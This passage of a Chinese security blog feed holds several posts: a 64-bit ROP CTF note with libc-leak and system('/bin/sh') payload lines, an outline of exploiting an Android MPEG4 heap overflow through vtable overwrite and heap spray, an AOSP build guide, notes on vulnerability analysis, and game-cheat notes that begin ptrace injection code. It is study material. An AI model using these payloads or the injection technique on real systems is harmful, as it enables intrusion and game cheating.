      <content type="html"><![CDATA[<h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul><li>64位rop</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-003022.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>构造rop,leak出libc地址，调用system(“/bin/sh”)</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>本机测试，所以我先找到自己本机用到的libc.so<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-005750.png" alt=""></p><h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><p>ROPgadget –binary xxx –only “pop|ret”<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-012434.png" alt=""></p><h3 id="leak-system地址和-bin-sh"><a href="#leak-system地址和-bin-sh" class="headerlink" title="leak system地址和/bin/sh"></a>leak system地址和/bin/sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u64(puts_addr)</span><br><span class="line">sh_addr = next(libc.search(&apos;/bin/sh&apos;))- libc.symbols[&apos;puts&apos;] + u64(puts_addr)</span><br></pre></td></tr></table></figure><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line"></span><br><span class="line">payload2=padding+p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2015-3864的思路</title>
      <link href="/2018/02/26/stage/"/>
      <url>/2018/02/26/stage/</url>
      <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>关于CVE-2015-3824漏洞本身<br>漏洞的原理是一个因为整数溢出，可以构造堆利用。<br><a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222893.htm</a></p><p><strong>在进行漏洞利用时，要关注各种可能分配内存的地方，灵活的使用代码中的内存分配，来布局内存。 同时研究一个漏洞要把相关知识给补齐。对于这个漏洞就是 MPEG4的文件格式和相关的处理代码了。</strong></p><h2 id="谷歌的exp"><a href="#谷歌的exp" class="headerlink" title="谷歌的exp"></a>谷歌的exp</h2><p>gp0是构造对象，然后溢出它的虚表，重定向到我们的gadaget。<br>进行大量的heap spray，保证能够执行到gadaget。</p><h2 id="Metaphor"><a href="#Metaphor" class="headerlink" title="Metaphor"></a>Metaphor</h2><p>另外有一个Metaphor，是CVE-2015-3824的利用工具，<br>攻击载荷：Web页面（可执行js代码），受害者需要在exp页面上驻留一会（heap spray需要多次尝试）</p><h2 id="关于虚表"><a href="#关于虚表" class="headerlink" title="关于虚表"></a>关于虚表</h2><p>(1)识别构造函数：给对象分配内存、将vtable拷贝到分配内存中、成员变量初始化。<br>(2)识别真正的vtable：vtable一定会在某个构造函数中被引用到，所以被引用到的就是真正的vtable。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083340.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083427.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083439.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083554.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083812.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android漏洞分析基础 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mac上编译android4.4.4源码</title>
      <link href="/2018/02/24/bianyi/"/>
      <url>/2018/02/24/bianyi/</url>
      <content type="html"><![CDATA[<p>一些碎碎念……本来因为想在mac上编译的，还专门买了一个外置的移动硬盘，然后自己按照官网和搜到的无数篇博客精心研究了很久很久，耗时三天，还是GG，但是基本上…xcode是个大坑，算了算了……反正最后始终没弄好，然后，虚拟机走起吧……</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先，虚拟机用的是mac上的parallels desktop，然后镜像是<a href="http://releases.ubuntu.com/12.04/ubuntu-12.04.5-desktop-amd64.iso.torrent?_ga=2.244298688.451892976.1519576871-1559322823.1519576871" target="_blank" rel="noopener">Ubuntu 12.04.5 Desktop (64-bit)</a></p><p>然后android源码在<a href="https://pan.baidu.com/s/1ngsZs#list/path=%2FAndroid%E6%BA%90%E7%A0%81" target="_blank" rel="noopener">这里</a>下载，我没有用repo，直接从百度云取的，用的是android4.4.4_r1<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-164515.png" alt=""><br>这样一共只需要下载2G多点……而不是70G（死目</p><p>mac上虚拟机快速配置就可以快速安装好系统，不过<strong>记得安装好后，修改一下硬件，空间给128G，内存改4096M，核数改2-4随便</strong>。</p><h2 id="安装Java-JDK-1-6"><a href="#安装Java-JDK-1-6" class="headerlink" title="安装Java JDK 1.6"></a>安装Java JDK 1.6</h2><p>jdk版本：jdk-6u45-linux-x64.bin<br>下载地址：<a href="http://app.nidc.kr/java/jdk-6u45-linux-x64.bin" target="_blank" rel="noopener">http://app.nidc.kr/java/jdk-6u45-linux-x64.bin</a></p><p>我们先在 /usr/local/目录下创建java文件夹：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">sudo mkdir java</span><br><span class="line">sudo cp [jdk-6u45-linux-x64.bin路径]  /usr/local/java</span><br><span class="line">sudo chmod 777 jdk-6u45-linux-x64.bin</span><br><span class="line">sudo ./jdk-6u45-linux-x64.bin</span><br></pre></td></tr></table></figure></p><p>安装成功后,java文件夹下多了一个文件夹：jdk1.6.0_45/<br>然后配置环境变量，用vim打开/ect/profile 文件,嗯，我不会用gedit，日常vim，这个其实随意。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure></p><p>添加下面的环境变量，要根据安装目录修改，并保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Java Environment</span><br><span class="line">export JAVA_HOME=/usr/local/java/jdk1.6.0_45  </span><br><span class="line"></span><br><span class="line">export JRE_HOME=/usr/local/java/jdk1.6.0_45/jre  </span><br><span class="line"></span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH  </span><br><span class="line"></span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$JAVA_HOME:$PATH</span><br></pre></td></tr></table></figure></p><p>重启后使其生效并进行验证<br>也可使用下面的命令不重启使其生效，不过只针对当前域有效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></p><p>其实我是没重启的，直接source就行了，只要不另在终端里开标签或者重启终端就可以。<br>输入java -version 进行验证安装,成功后返回如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;1.6.0_45&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.6.0_45-b06)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 20.45-b01, mixed mode)</span><br></pre></td></tr></table></figure></p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git gnupg flex bison gperf build-essential \</span><br><span class="line">  zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev \</span><br><span class="line">  libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-glx:i386 \</span><br><span class="line">  libgl1-mesa-dev g++-multilib mingw32 tofrodos \</span><br><span class="line">  python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line"></span><br><span class="line">sudo ln -s /usr/lib/i386-linux-gnu/mesa/libGL.so.1 /usr/lib/i386-linux-gnu/libGL.so</span><br></pre></td></tr></table></figure><p>必须提到的是！我之前一直遇到很坑的问题，那就是虚拟机重启后打不开，始终没有解决，直到我不死心的尝试第n次，然后搜到了这个。<br><a href="http://www.cnblogs.com/wangzehuaw/p/4057604.html" target="_blank" rel="noopener">http://www.cnblogs.com/wangzehuaw/p/4057604.html</a><br><strong>划重点</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git gnupg flex bison gperf build-essential \</span><br><span class="line">&gt;   zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev \</span><br><span class="line">&gt;   libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-glx:i386 \</span><br><span class="line">&gt;   libgl1-mesa-dev g++-multilib mingw32 tofrodos \</span><br><span class="line">&gt;   python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">zip is already the newest version.</span><br><span class="line">zip set to manually installed.</span><br><span class="line">gnupg is already the newest version.</span><br><span class="line">Some packages could not be installed. This may mean that you have</span><br><span class="line">requested an impossible situation or if you are using the unstable</span><br><span class="line">distribution that some required packages have not yet been created</span><br><span class="line">or been moved out of Incoming.</span><br><span class="line">The following information may help to resolve the situation:</span><br><span class="line"></span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> libgl1-mesa-glx:i386 : Depends: libglapi-mesa:i386 (= 8.0.4-0ubuntu0.6)</span><br><span class="line">                        Recommends: libgl1-mesa-dri:i386 (&gt;= 7.2)</span><br><span class="line">E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></table></figure></p><p><strong>提示信息说缺少依赖库无法安装libgl1-mesa-glx:i386，那么就不要安装这个库了，从上面的install列表中减去这个库。<br>libgl1-mesa-glx:i386。如果强制安装了这个库会导致重启或关机后无法进入ubuntu问题，很严重。<br>如果也遇到了无法进入ubuntu系统的问题，请重装系统时不要安装这个库。</strong><br>我真的第一次见到会break desktop的库……服了服了。</p><p><strong>就因为这个坑了我三天！！！</strong></p><p>所以像我一样直接去掉吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git gnupg flex bison gperf build-essential zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib mingw32 tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line">sudo ln -s /usr/lib/i386-linux-gnu/mesa/libGL.so.1 /usr/lib/i386-linux-gnu/libGL.so</span><br></pre></td></tr></table></figure></p><h2 id="解压源码"><a href="#解压源码" class="headerlink" title="解压源码"></a>解压源码</h2><p>把之前下载的源码的7z包解压，比如我是建了个目录aosp，然后解压后，就有个android-4.4.4_r1的文件夹。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-171005.png" alt=""></p><p>7z文件需要下一个东西来解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install p7zip-full</span><br><span class="line">7z x android-4.4.4_r1.7z</span><br></pre></td></tr></table></figure></p><p>解压好之后，进入源码路径，如果你的目录结构和我一样，就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aosp/android-4.4.4_r1</span><br></pre></td></tr></table></figure></p><h2 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h2><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>命令删除所有以前编译操作的已有输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make clobber</span><br></pre></td></tr></table></figure></p><h3 id="设置环境"><a href="#设置环境" class="headerlink" title="设置环境"></a>设置环境</h3><p>使用build目录中的envsetup.sh脚本初始化环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source build/envsetup.sh</span><br></pre></td></tr></table></figure></p><h3 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h3><p>因为我不下载到实体机里，就直接输入lunch，然后回车即可。<br>默认选择第一个，即lunch aosp_arm-eng，该命令表示针对模拟器进行完整编译，并且所有调试功能均处于启用状态。</p><h3 id="进行编译"><a href="#进行编译" class="headerlink" title="进行编译"></a>进行编译</h3><p>编译前先看看你配置了几个核，然后make -j(核数✖️2)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cpuinfo | grep processor</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-171708.png" alt=""><br>可看到自己创建的虚拟机CPU核心共有2个，所以make -j4<br>编译后输出的文件都放在了源码根目录下的out文件中。</p><h2 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -partition-size 300</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-181351.png" alt=""></p><h2 id="导入android源码进android-studio"><a href="#导入android源码进android-studio" class="headerlink" title="导入android源码进android studio"></a>导入android源码进android studio</h2><p>网上的做法比较乱，我只写一下我是怎么做的。<br>1.在整个Android源码全编成功之后，然后编译idegen模块，用以生成Android studio的工程配置文件,编译成功之后就生成了idegen.jar（out/host/darwin-x86/framework/idegen.jar），运行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source build/ensetup.sh</span><br><span class="line">mmm development/tools/idegen/</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-133125.png" alt=""><br>2.在源码根目录生成对应的android.ipr、android.iml IEDA工程配置文件。以便于AndroidStudio可以打开项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-133411.png" alt=""><br>3.下载android studio并启动<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-133436.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/android-studio/bin</span><br><span class="line">./studio.sh</span><br></pre></td></tr></table></figure></p><p>第一次启动要安装sdk，所以记得翻墙。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-134145.png" alt=""><br>4.导入<br>打开 Android studio，选择刚刚生成的 android.ipr 打开，等待加载好了就可以了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-140455.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/source/initializing#installing-required-packages-ubuntu-1204" target="_blank" rel="noopener">https://source.android.com/source/initializing#installing-required-packages-ubuntu-1204</a><br><a href="https://source.android.com/source/requirements#older-versions" target="_blank" rel="noopener">https://source.android.com/source/requirements#older-versions</a><br><a href="https://bbs.pediy.com/thread-218366.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218366.htm</a><br><a href="https://bbs.pediy.com/thread-218513.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218513.htm</a></p>]]></content>
      
      <categories>
          
          <category> Android漏洞分析基础 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Android漏洞分析</title>
      <link href="/2018/02/23/android1/"/>
      <url>/2018/02/23/android1/</url>
      <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>漏洞分析是指在代码中迅速定位漏洞产生的位置（简称溯源），理解攻击原理，并根据漏洞类型、漏洞利用技术以及目标平台的漏洞缓解技术，准确评估该漏洞的利用方式和风险等级的过程。</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>通过漏洞公布平台手机漏洞的信息，信息包括：漏洞厂商、影响版本、漏洞描述、漏洞发现时间、漏洞公布的时间、漏洞的状态以及漏洞POC、漏洞patch等。这些信息中比较重要的是漏洞的POC和patch，但有时漏洞公布不全面可能不包括POC，只有通过漏洞描述展开分析。</p><table><thead><tr><th>漏洞信息</th><th style="text-align:right">描述</th></tr></thead><tbody><tr><td>漏洞厂商</td><td style="text-align:right">todo</td></tr><tr><td>影响版本</td><td style="text-align:right">todo</td></tr><tr><td>漏洞描述</td><td style="text-align:right">todo</td></tr><tr><td>发现时间</td><td style="text-align:right">todo</td></tr><tr><td>公布时间</td><td style="text-align:right">todo</td></tr><tr><td>漏洞状态</td><td style="text-align:right">todo</td></tr><tr><td>漏洞POC</td><td style="text-align:right">todo</td></tr><tr><td>漏洞patch</td><td style="text-align:right">todo</td></tr></tbody></table><h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p>正确的判断漏洞产生的根源是漏洞分析中最重要的一步,在溯源过程中要明确两个问题.</p><ul><li>漏洞的类型。对于Android系统这样庞大的代码体系，任何位置都有可能产生bug，但漏洞的类型就固定几种，典型漏洞类型包括：栈溢出、堆溢出、整型溢出、格式化字符串、双重释放（Double free）、释放重用（UAF）等。</li><li>漏洞的逻辑。通过一些技巧可以精确的定位漏洞产生的位置，但要更好的理解漏洞产生的根源，还是需要理解漏洞是如何被触发的，这就需要去了解漏洞所在的系统模块及其运作原理。<h3 id="溯源方式"><a href="#溯源方式" class="headerlink" title="溯源方式"></a>溯源方式</h3>通常溯源展开方式依据我们能拿到的漏洞信息，可以分为三种情况：</li><li>漏洞信息中提供了POC。此时需要部署实验环境，使用POC来重现漏洞攻击，并通过调试技术定位漏洞所在函数，进一步确定代码行数。</li><li>漏洞已经发布补丁。此时只需对照patch前后代码即可定位漏洞存在的代码位置。</li><li>只有漏洞描述。<h3 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h3>扎实的调试技术是定位漏洞和利用漏洞的基础。<br>在定位漏洞时，通常触发漏洞后，看到的是系统崩溃或者是更加隐秘的程序逻辑错误，不管哪种都说明程序偏离了原本的执行流程，我们可以借助调试技术来观察系统崩溃状态重要的寄存器、内存的值和状态，并根据反汇编代码逐步回溯找到根源。同时也可以通过函数调用栈回溯函数调用过程，了解漏洞执行过程，各个函数的参数值，能够找到触发漏洞的异常输入，并通过分析异常输出和正常输入，这样可以为理解错误原因提供帮助。<br>在利用漏洞时，调试技术可以帮助我们调试利用代码，辅助适配各个机型等。</li></ul><p>android系统包括应用层、框架层、Native层、内核层。调试也是按层展开。</p><ul><li>smali动态调试：使用smalidea+android studio</li><li>so库动态调试： <a href="http://eternalsakura13.com/2018/01/30/ali_re2/">http://eternalsakura13.com/2018/01/30/ali_re2/</a></li><li>android系统Java源码调试及c/c++源码调试：这个需要下载AOSP源码，然后自己编译才能调试，编译过程参考，<a href="http://eternalsakura13.com/2018/02/24/bianyi/">http://eternalsakura13.com/2018/02/24/bianyi/</a></li></ul>]]></content>
      
      <categories>
          
          <category> Android漏洞分析基础 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>《游戏安全:手游安全技术入门》理论篇</title>
      <link href="/2018/02/22/youxi/"/>
      <url>/2018/02/22/youxi/</url>
      <content type="html"><![CDATA[<h1 id="1-12章"><a href="#1-12章" class="headerlink" title="1-12章"></a>1-12章</h1><p>因为我读这本书的初衷是研究native层的注入和hook技术，并不十分关注游戏外挂本身，而且我已经有一定的逆向经验，所以这部分我只是大致看了看外挂的种类和游戏漏洞的风险点。</p><h2 id="需要学习的语言"><a href="#需要学习的语言" class="headerlink" title="需要学习的语言"></a>需要学习的语言</h2><p>在逆向分析中主要掌握的是ARM、c、c++、oc，但是除此之外，android软件经常使用的java以及smali代码，还有U3D主逻辑使用的c#和IL代码，以及某些游戏会使用lua或py脚本来写主逻辑，遇到这些语言，只需要在遇到他们时能够读懂基本逻辑即可。</p><h2 id="外挂技术——静态修改"><a href="#外挂技术——静态修改" class="headerlink" title="外挂技术——静态修改"></a>外挂技术——静态修改</h2><p>如果已经了解游戏的关键逻辑代码的位置，就可以直接修改，针对不同的语言有不同的修改方式，如针对c#编写的逻辑，用ildasm反编译后，修改IL指令，然后通过ilasm编译成dll文件，替换原安装包中的即可。</p><h2 id="外挂技术——动态修改"><a href="#外挂技术——动态修改" class="headerlink" title="外挂技术——动态修改"></a>外挂技术——动态修改</h2><p>若游戏做了比较严格的完整性校验或签名校验，难以静态绕过，则可以考虑动态。</p><h2 id="漏洞的实现原理"><a href="#漏洞的实现原理" class="headerlink" title="漏洞的实现原理"></a>漏洞的实现原理</h2><ul><li>游戏逻辑漏洞<br>通过修改客户端的游戏来实现外挂功能，游戏逻辑漏洞与游戏网络交互关系密切，如果游戏的绝大部分逻辑在服务端实现，客户端只是同步结果，则这类强联网游戏的安全性较好。</li><li>游戏协议稳定型漏洞<br>协议稳定型漏洞是指构造畸形协议导致协议处理方在处理协议时出现崩溃的漏洞。<br>协议稳定型漏洞的挖掘过程实际上就是畸形协议的构造过程，而畸形协议字段的构造可考虑通过Fuzz工具的思想实现，对各类边缘值的测试。</li><li>游戏服务端校验疏忽型漏洞<br>本质上就是Web漏洞，服务端校验不严格。</li></ul><h2 id="手游的分类和风险点"><a href="#手游的分类和风险点" class="headerlink" title="手游的分类和风险点"></a>手游的分类和风险点</h2><p>99-104页</p><h1 id="13章-注入技术的实现原理"><a href="#13章-注入技术的实现原理" class="headerlink" title="13章 注入技术的实现原理"></a>13章 注入技术的实现原理</h1><h2 id="ptrace注入技术的实现"><a href="#ptrace注入技术的实现" class="headerlink" title="ptrace注入技术的实现"></a>ptrace注入技术的实现</h2><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-22-033620.jpg" alt=""></p><h3 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h3><p>Android.mk<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)  </span><br><span class="line">  </span><br><span class="line">include $(CLEAR_VARS)  </span><br><span class="line">LOCAL_MODULE := inject   </span><br><span class="line">LOCAL_SRC_FILES := ptraceInject.c InjectModule.c shellcode.s</span><br><span class="line">  </span><br><span class="line">LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog  </span><br><span class="line">  </span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure></p><p>InjectModule.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">  FileName: InjectModule.c</span></span><br><span class="line"><span class="comment">  Description:       ptrace注入      </span></span><br><span class="line"><span class="comment">***********************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;    </span></span></span><br><span class="line"><span 